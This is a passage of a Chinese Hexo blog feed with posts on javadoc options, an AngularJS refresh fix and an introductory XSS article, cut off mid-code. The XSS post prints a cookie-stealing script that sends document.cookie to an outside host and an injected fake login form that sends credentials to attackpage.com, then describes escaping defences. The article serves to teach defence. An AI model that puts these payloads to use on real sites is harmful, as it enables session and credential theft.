&lt;h2 id=&quot;一、查看javadoc帮助文档&quot;&gt;&lt;a href=&quot;#一、查看javadoc帮助文档&quot; class=&quot;headerlink&quot; title=&quot;一、查看javadoc帮助文档&quot;&gt;&lt;/a&gt;一、查看javadoc帮助文档&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yerba-buena:~ yeshaoting$ javadoc --&lt;span class=&quot;built_in&quot;&gt;help&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;javadoc: 错误 - 无效的标记: --&lt;span class=&quot;built_in&quot;&gt;help&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;用法: javadoc [options] [packagenames] [sourcefiles] [@files]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -overview &amp;lt;file&amp;gt;                 从 HTML 文件读取概览文档&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -public                          仅显示 public 类和成员&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -protected                       显示 protected/public 类和成员 (默认值)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -package                         显示 package/protected/public 类和成员&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -private                         显示所有类和成员&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -&lt;span class=&quot;built_in&quot;&gt;help&lt;/span&gt;                            显示命令行选项并退出&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -doclet &amp;lt;class&amp;gt;                  通过替代 doclet 生成输出&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -docletpath &amp;lt;path&amp;gt;               指定查找 doclet 类文件的位置&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -sourcepath &amp;lt;pathlist&amp;gt;           指定查找源文件的位置&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -classpath &amp;lt;pathlist&amp;gt;            指定查找用户类文件的位置&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -cp &amp;lt;pathlist&amp;gt;                   指定查找用户类文件的位置&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -exclude &amp;lt;pkglist&amp;gt;               指定要排除的程序包列表&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -subpackages &amp;lt;subpkglist&amp;gt;        指定要递归加载的子程序包&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -breakiterator                   计算带有 BreakIterator 的第一个语句&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -bootclasspath &amp;lt;pathlist&amp;gt;        覆盖由引导类加载器所加载的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                   类文件的位置&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -&lt;span class=&quot;built_in&quot;&gt;source&lt;/span&gt; &amp;lt;release&amp;gt;                提供与指定发行版的源兼容性&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -extdirs &amp;lt;dirlist&amp;gt;               覆盖所安装扩展的位置&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -verbose                         输出有关 Javadoc 正在执行的操作的信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -locale &amp;lt;name&amp;gt;                   要使用的区域设置, 例如 en_US 或 en_US_WIN&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -encoding &amp;lt;name&amp;gt;                 源文件编码名称&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -quiet                           不显示状态消息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -J&amp;lt;flag&amp;gt;                         直接将 &amp;lt;flag&amp;gt; 传递到运行时系统&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -X                               输出非标准选项的提要&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;通过标准 doclet 提供:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -d &amp;lt;directory&amp;gt;                   输出文件的目标目录&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -use                             创建类和程序包用法页面&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -version                         包含 @version 段&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -author                          包含 @author 段&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -docfilessubdirs                 递归复制文档文件子目录&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -splitindex                      将索引分为每个字母对应一个文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -windowtitle &amp;lt;text&amp;gt;              文档的浏览器窗口标题&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -doctitle &amp;lt;html-code&amp;gt;            包含概览页面的标题&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -header &amp;lt;html-code&amp;gt;              包含每个页面的页眉文本&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -footer &amp;lt;html-code&amp;gt;              包含每个页面的页脚文本&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -top    &amp;lt;html-code&amp;gt;              包含每个页面的顶部文本&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -bottom &amp;lt;html-code&amp;gt;              包含每个页面的底部文本&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -link &amp;lt;url&amp;gt;                      创建指向位于 &amp;lt;url&amp;gt; 的 javadoc 输出的链接&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -linkoffline &amp;lt;url&amp;gt; &amp;lt;url2&amp;gt;        利用位于 &amp;lt;url2&amp;gt; 的程序包列表链接至位于 &amp;lt;url&amp;gt; 的文档&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -excludedocfilessubdir &amp;lt;name1&amp;gt;:.. 排除具有给定名称的所有文档文件子目录。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -group &amp;lt;name&amp;gt; &amp;lt;p1&amp;gt;:&amp;lt;p2&amp;gt;..        在概览页面中, 将指定的程序包分组&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -nocomment                       不生成说明和标记, 只生成声明。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -nodeprecated                    不包含 @deprecated 信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -noqualifier &amp;lt;name1&amp;gt;:&amp;lt;name2&amp;gt;:... 输出中不包括指定限定符的列表。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -nosince                         不包含 @since 信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -notimestamp                     不包含隐藏时间戳&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -nodeprecatedlist                不生成已过时的列表&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -notree                          不生成类分层结构&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -noindex                         不生成索引&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -nohelp                          不生成帮助链接&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -nonavbar                        不生成导航栏&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -serialwarn                      生成有关 @serial 标记的警告&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -tag &amp;lt;name&amp;gt;:&amp;lt;locations&amp;gt;:&amp;lt;header&amp;gt; 指定单个参数定制标记&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -taglet                          要注册的 Taglet 的全限定名称&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -tagletpath                      Taglet 的路径&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -charset &amp;lt;charset&amp;gt;               用于跨平台查看生成的文档的字符集。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -helpfile &amp;lt;file&amp;gt;                 包含帮助链接所链接到的文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -linksource                      以 HTML 格式生成源文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -sourcetab &amp;lt;tab length&amp;gt;          指定源中每个制表符占据的空格数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -keywords                        使程序包, 类和成员信息附带 HTML 元标记&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -stylesheetfile &amp;lt;path&amp;gt;           用于更改生成文档的样式的文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -docencoding &amp;lt;name&amp;gt;              指定输出的字符编码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="后端开发" scheme="http://yeshaoting.cn/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="java" scheme="http://yeshaoting.cn/tags/java/"/>
    
    <category term="javadoc" scheme="http://yeshaoting.cn/tags/javadoc/"/>
    
  </entry>
  
  <entry>
    <title>angularjs视图跳转不刷新问题</title>
    <link href="http://yeshaoting.cn/article/js/angularjs%E8%A7%86%E5%9B%BE%E8%B7%B3%E8%BD%AC%E4%B8%8D%E5%88%B7%E6%96%B0%E9%97%AE%E9%A2%98/"/>
    <id>http://yeshaoting.cn/article/js/angularjs%E8%A7%86%E5%9B%BE%E8%B7%B3%E8%BD%AC%E4%B8%8D%E5%88%B7%E6%96%B0%E9%97%AE%E9%A2%98/</id>
    <published>2016-03-09T07:56:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/angularjs.png" class="img-logo img-center" /><p>在实际工作过程中，发现通过 <code>$state.go(&quot;stage2&quot;)</code> 让视图跳转到stage2，但视图内容并不刷新。</p><h2 id="一、问题解决"><a href="#一、问题解决" class="headerlink" title="一、问题解决"></a>一、问题解决</h2><h3 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1. 方法一"></a>1. 方法一</h3><p>通过修改地址栏内容，模板一次用户通过地址栏输入地址操作。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//be sure to inject $scope and $location</span></span><br><span class="line"><span class="keyword">var</span> changeLocation = <span class="function"><span class="keyword">function</span>(<span class="params">url, forceReload</span>) </span>&#123;</span><br><span class="line">  $scope = $scope || angular.element(<span class="built_in">document</span>).scope();</span><br><span class="line">  <span class="keyword">if</span>(forceReload || $scope.$$phase) &#123;</span><br><span class="line">    <span class="built_in">window</span>.location = url;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//only use this if you want to replace the history stack</span></span><br><span class="line">    <span class="comment">//$location.path(url).replace();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//this this if you want to change the URL and add it to the history stack</span></span><br><span class="line">    $location.path(url);</span><br><span class="line">    $scope.$apply();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2. 方法二"></a>2. 方法二</h3><p>通过自带的参数reload，要求视图跳转时强制刷新视图内容。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$state.go(<span class="string">&quot;stage2&quot;</span>, &#123;&#125;, &#123;<span class="string">&quot;reload&quot;</span>: <span class="literal">true</span>&#125;);</span><br></pre></td></tr></table></figure><p>或者视图跳转完后，通过reloa()方法刷新视图。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$state.go(<span class="string">&quot;stage2&quot;</span>);</span><br><span class="line">$state.reload(<span class="string">&quot;stage2&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="二、参考文档"><a href="#二、参考文档" class="headerlink" title="二、参考文档"></a>二、参考文档</h2><ul><li><a href="http://stackoverflow.com/a/14387747">In Angular, how to redirect with $location.path as $http.post success callback</a></li><li><a href="http://angular-ui.github.io/ui-router/site/#/api/ui.router.state.$state">$state</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/angularjs.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;在实际工作过程中，发现通过 &lt;code&gt;$state.go(&amp;quot;stage2&amp;quot;)&lt;/code&gt; 让</summary>
      
    
    
    
    <category term="前端设计" scheme="http://yeshaoting.cn/categories/%E5%89%8D%E7%AB%AF%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="angularjs" scheme="http://yeshaoting.cn/tags/angularjs/"/>
    
  </entry>
  
  <entry>
    <title>WEB安全初探之XSS</title>
    <link href="http://yeshaoting.cn/article/security/WEB%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2%E4%B9%8BXSS/"/>
    <id>http://yeshaoting.cn/article/security/WEB%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2%E4%B9%8BXSS/</id>
    <published>2016-03-09T07:48:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/xss.png" class="img-logo img-center" /><p>XSS 全称(Cross Site Scripting) 跨站脚本攻击，是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。比如获取用户的Cookie，导航到恶意网站,携带木马等。</p><h2 id="0x01-XSS攻击的分类"><a href="#0x01-XSS攻击的分类" class="headerlink" title="0x01 XSS攻击的分类"></a>0x01 XSS攻击的分类</h2><p>根据XSS脚本注入方式的不同，我们可以对XSS攻击进行简单的分类。其中，最常见的就数反射型XSS和存储型XSS了。</p><h3 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1. 反射型XSS"></a>1. 反射型XSS</h3><p>反射型XSS，又称非持久型XSS。之所以称为反射型XSS，则是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。而称为非持久型XSS，则是因为这种攻击方式具有一次性。<br>攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。</p><h3 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2. 存储型XSS"></a>2. 存储型XSS</h3><p>存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。</p><h2 id="0x02-XSS攻击的手段及其危害"><a href="#0x02-XSS攻击的手段及其危害" class="headerlink" title="0x02 XSS攻击的手段及其危害"></a>0x02 XSS攻击的手段及其危害</h2><h3 id="1-窃取Cookie"><a href="#1-窃取Cookie" class="headerlink" title="1. 窃取Cookie"></a>1. 窃取Cookie</h3><p>具体实现方法：<br>先构造语句<code>&lt;script&gt;window.open(&#39;http://dlgyi.rrvv.net/cookie.asp?msg=&#39;+document.cookie)&lt;/script&gt;</code><br>这句话意思是打开一个新的窗口，访问<a href="http://dlgyi.rrvv.net/cookie.asp%E8%BF%99%E4%B8%AA%E7%BD%91%E5%9D%80%EF%BC%8C%E5%B9%B6%E4%B8%94%E9%80%9A%E8%BF%87msg%E4%BC%A0%E9%80%92%E4%B8%80%E4%B8%AA%E5%8F%98%E9%87%8F%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84%E5%8F%98%E9%87%8F%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E8%A6%81%E6%94%B6%E9%9B%86%E7%9A%84cookie%E4%BA%86%E3%80%82">http://dlgyi.rrvv.net/cookie.asp这个网址，并且通过msg传递一个变量，这里的变量就是我们要收集的cookie了。</a></p><h3 id="2-引导钓鱼"><a href="#2-引导钓鱼" class="headerlink" title="2. 引导钓鱼"></a>2. 引导钓鱼</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;</span></span><br><span class="line"><span class="javascript">                   location.replace(“http:<span class="comment">//www.attackpage.com/record.asp?username=“</span></span></span><br><span class="line"><span class="javascript">+<span class="built_in">document</span>.forms[<span class="number">0</span>].user.value + “password=” + <span class="built_in">document</span>.forms[<span class="number">0</span>].pass.value);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">HR</span>&gt;</span><span class="tag">&lt;<span class="name">H3</span>&gt;</span>这个功能需要登录:&lt;/H3 &gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>请输入用户名：<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”text”</span> <span class="attr">id</span>=<span class="string">”user”name</span>=<span class="string">”user”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>请输入密码：<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”password”</span> <span class="attr">name</span> =<span class="string">“pass”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”submit”name</span>=<span class="string">”login”</span> <span class="attr">value</span>=<span class="string">”登录”onclick</span>=<span class="string">”hack()”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">HR</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注入上面的代码后，则会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样，攻击者就成功窃取了该用户的账号信息。</p><span id="more"></span><h2 id="0x03-XSS的预防"><a href="#0x03-XSS的预防" class="headerlink" title="0x03 XSS的预防"></a>0x03 XSS的预防</h2><h3 id="1-前端过滤XSS"><a href="#1-前端过滤XSS" class="headerlink" title="1. 前端过滤XSS"></a>1. 前端过滤XSS</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xssCheck</span>(<span class="params">str,reg</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str ? str.replace(reg || <span class="regexp">/[&amp;&lt;&quot;&gt;&#x27;](?:(amp|lt|quot|gt|#39|nbsp|#\d+);)?/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(b)&#123;</span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="string">&#x27;&lt;&#x27;</span>:<span class="string">&#x27;&amp;lt;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&amp;&#x27;</span>:<span class="string">&#x27;&amp;amp;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&quot;&#x27;</span>:<span class="string">&#x27;&amp;quot;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&gt;&#x27;</span>:<span class="string">&#x27;&amp;gt;&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;&#x27;&quot;</span>:<span class="string">&#x27;&amp;#39;&#x27;</span>,</span><br><span class="line">            &#125;[a]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-后端预防"><a href="#2-后端预防" class="headerlink" title="2. 后端预防"></a>2. 后端预防</h3><h4 id="spring提供的方法"><a href="#spring提供的方法" class="headerlink" title="spring提供的方法"></a>spring提供的方法</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>defaultHtmlEscape<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">Forms加上：<span class="tag">&lt;<span class="name">spring:htmlEscape</span> <span class="attr">defaultHtmlEscape</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h4 id="手动escape"><a href="#手动escape" class="headerlink" title="手动escape"></a>手动escape</h4><p>首先添加一个jar包：commons-lang-2.5.jar ，然后在后台调用这些函数：StringEscapeUtils.escapeHtml(string); StringEscapeUtils.escapeJavaScript(string); StringEscapeUtils.escapeSql(string);</p><h4 id="后台加Filter"><a href="#后台加Filter" class="headerlink" title="后台加Filter"></a>后台加Filter</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span 